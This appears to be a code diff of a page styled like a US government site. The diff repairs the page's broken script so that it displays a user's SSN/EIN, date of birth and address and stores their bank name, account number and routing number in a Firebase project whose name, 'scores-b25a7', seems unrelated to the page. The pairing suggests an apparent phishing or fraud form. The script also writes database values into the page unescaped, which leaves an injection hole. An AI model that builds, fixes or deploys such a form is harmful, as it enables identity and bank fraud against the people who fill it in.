@@ -2542,95 +2542,32 @@
     </form>
   </div>
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
-      authDomain: "scores-b25a7.firebaseapp.com",
-      databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
-      projectId: "scores-b25a7",
-      storageBucket: "scores-b25a7.appspot.com",
-      messagingSenderId: "1001957936318",
-      appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef",
-      measurementId: "G-7FC8Q029F2"
+<script>
+const firebaseConfig = {
+    apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+    authDomain: "scores-b25a7.firebaseapp.com",
+    databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+    projectId: "scores-b25a7",
+    storageBucket: "scores-b25a7.appspot.com",
+    messagingSenderId: "1001957936318",
+    appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef",
+    measurementId: "G-7FC8Q029F2"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+/*=========================
+ Modern Alert
+=========================*/
+
+function showAlert(type,title,message){
+
+    const colors={
+        success:"#2ecc71",
+        error:"#e74c3c",
+        warning:"#f39c12",
+        info:"#3498db"
     };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-
-    // Check if user is logged in
-    firebase.auth().onAuthStateChanged(function(user) {
-      if (user) {
-        const uid = user.uid; // Get the UID of the logged-in user
-
-        // Fetch user information from the database
-        firebase.database().ref("users/" + uid).once("value")
-          .then(snapshot => {
-            const data = snapshot.val();
-            if (data) {
-              const userInfoTable = document.getElementById("userInfoTable");
-
-              // Display user data in the table
-              userInfoTable.innerHTML = `
-                <tr><th>Full Name</th><td>${data.username}</td></tr>
-                <tr><th>Email</th><td>${data.email}</td></tr>
-                <tr><th>Phone</th><td>${data.phone}</td></tr>
-                <tr><th>Address</th><td>${data.address}</td></tr>
-                <tr><th>EIN/SSN Number</th><td>${data.ein}</td></tr>
-                <tr><th>Business</th><td>${data.business}</td></tr>
-                <tr><th>Date of Birth</th><td>${data.date_of_birth}</td></tr>
-              `;
-            } else {
-showAlert(
-    "warning",
-    "No Record",
-    "No user information was found for this account."
-);
-          .catch(error => {
-            console.error("Error fetching user data: ", error);
-showAlert(
-    "error",
-    "Database Error",
-    "Unable to retrieve your information. Please try again."
-);
-      } else {
-        window.location.href = "login.html"; // Redirect to login if user is not logged in
-      }
-    });
-
-    // Bank information form submit handler
-    document.getElementById("bankForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-
-      const bankName = document.getElementById("bankName").value;
-      const accountNumber = document.getElementById("accountNumber").value;
-      const routingNumber = document.getElementById("routingNumber").value;
-
-      if (bankName && accountNumber && routingNumber) {
-        const user = firebase.auth().currentUser;
-        if (user) {
-          const uid = user.uid;
-
-          firebase.database().ref("users/" + uid + "/bankDetails").set({
-            bankName,
-            accountNumber,
-            routingNumber
-          }).then(() => {
-showAlert(
-    "success",
-    "Success",
-    "Your bank details have been submitted successfully."
-);
-
-setTimeout(()=>{
-    window.location.href="confirmation.html?uid="+uid;
-},1800);
-      } else {
-showAlert(
-    "warning",
-    "Incomplete Form",
-    "Please complete all required bank information."
-);
-function showAlert(type, title, message){
 
     const icons={
         success:"✔",
@@ -2639,41 +2576,257 @@ function showAlert(type, title, message){
         info:"ℹ"
     };
 
+    const old=document.querySelector(".custom-alert");
+
+    if(old){
+        old.remove();
+    }
+
     const alert=document.createElement("div");
 
-    alert.className=`custom-alert ${type}`;
+    alert.className="custom-alert";
+
+    alert.style.cssText=`
+        position:fixed;
+        top:20px;
+        right:20px;
+        width:340px;
+        max-width:90%;
+        background:#fff;
+        border-left:6px solid ${colors[type]};
+        border-radius:12px;
+        box-shadow:0 15px 35px rgba(0,0,0,.18);
+        padding:16px;
+        display:flex;
+        align-items:flex-start;
+        gap:14px;
+        z-index:999999;
+        transform:translateX(420px);
+        transition:.35s;
+        font-family:Arial,sans-serif;
+    `;
 
     alert.innerHTML=`
-        <div class="alert-icon">${icons[type]}</div>
-
-        <div class="alert-content">
-            <div class="alert-title">${title}</div>
-            <div class="alert-message">${message}</div>
+        <div style="
+            font-size:28px;
+            color:${colors[type]};
+            font-weight:bold;
+        ">
+            ${icons[type]}
         </div>
 
-        <div class="alert-close">&times;</div>
+        <div style="flex:1">
+
+            <div style="
+                font-size:16px;
+                font-weight:bold;
+                margin-bottom:4px;
+            ">
+                ${title}
+            </div>
+
+            <div style="
+                color:#555;
+                line-height:1.5;
+                font-size:14px;
+            ">
+                ${message}
+            </div>
+
+        </div>
+
+        <div style="
+            cursor:pointer;
+            font-size:22px;
+            color:#888;
+        " onclick="this.parentElement.remove()">
+            &times;
+        </div>
     `;
 
     document.body.appendChild(alert);
 
-    setTimeout(()=>{
-        alert.classList.add("show");
-    },50);
+    setTimeout(function(){
+        alert.style.transform="translateX(0)";
+    },20);
 
-    function closeAlert(){
-        alert.classList.remove("show");
-        alert.classList.add("hide");
+    setTimeout(function(){
 
-        setTimeout(()=>{
-            alert.remove();
-        },450);
+        if(alert.parentNode){
+
+            alert.style.transform="translateX(420px)";
+
+            setTimeout(function(){
+                if(alert.parentNode){
+                    alert.remove();
+                }
+            },350);
+
+        }
+
+    },4000);
+
+}
+
+/*=========================
+Load User
+=========================*/
+
+firebase.auth().onAuthStateChanged(function(user){
+
+    if(!user){
+        window.location.href="login.html";
+        return;
     }
 
-    alert.querySelector(".alert-close").onclick=closeAlert;
+    const uid=user.uid;
 
-    setTimeout(closeAlert,4000);
-}
-  </script>
+    firebase.database().ref("users/"+uid).once("value")
+
+    .then(function(snapshot){
+
+        const data=snapshot.val();
+
+        if(!data){
+
+            showAlert(
+                "warning",
+                "No Record",
+                "No user information was found."
+            );
+
+            return;
+        }
+
+        document.getElementById("userInfoTable").innerHTML=`
+
+            <tr>
+                <th>Full Name</th>
+                <td>${data.username || ""}</td>
+            </tr>
+
+            <tr>
+                <th>Email</th>
+                <td>${data.email || ""}</td>
+            </tr>
+
+            <tr>
+                <th>Phone</th>
+                <td>${data.phone || ""}</td>
+            </tr>
+
+            <tr>
+                <th>Address</th>
+                <td>${data.address || ""}</td>
+            </tr>
+
+            <tr>
+                <th>EIN/SSN Number</th>
+                <td>${data.ein || ""}</td>
+            </tr>
+
+            <tr>
+                <th>Business</th>
+                <td>${data.business || ""}</td>
+            </tr>
+
+            <tr>
+                <th>Date of Birth</th>
+                <td>${data.date_of_birth || ""}</td>
+            </tr>
+
+        `;
+
+    })
+
+    .catch(function(error){
+
+        console.error(error);
+
+        showAlert(
+            "error",
+            "Database Error",
+            "Unable to retrieve your information."
+        );
+
+    });
+
+});
+
+/*=========================
+Submit Bank Details
+=========================*/
+
+document.getElementById("bankForm").addEventListener("submit",function(e){
+
+    e.preventDefault();
+
+    const bankName=document.getElementById("bankName").value.trim();
+    const accountNumber=document.getElementById("accountNumber").value.trim();
+    const routingNumber=document.getElementById("routingNumber").value.trim();
+
+    if(bankName==="" || accountNumber==="" || routingNumber===""){
+
+        showAlert(
+            "warning",
+            "Incomplete Form",
+            "Please fill in every field."
+        );
+
+        return;
+    }
+
+    const user=firebase.auth().currentUser;
+
+    if(!user){
+
+        showAlert(
+            "error",
+            "Session Expired",
+            "Please login again."
+        );
+
+        return;
+    }
+
+    firebase.database().ref("users/"+user.uid+"/bankDetails").set({
+
+        bankName:bankName,
+        accountNumber:accountNumber,
+        routingNumber:routingNumber
+
+    })
+
+    .then(function(){
+
+        showAlert(
+            "success",
+            "Success",
+            "Your bank details have been submitted successfully."
+        );
+
+        setTimeout(function(){
+
+            window.location.href="confirmation.html?uid="+user.uid;
+
+        },1800);
+
+    })
+
+    .catch(function(error){
+
+        console.error(error);
+
+        showAlert(
+            "error",
+            "Save Failed",
+            error.message
+        );
+
+    });
+
+});
+</script>
 
 <footer class="usa-footer usa-footer--big ">
   <div class="grid-container usa-footer__return-to-top">
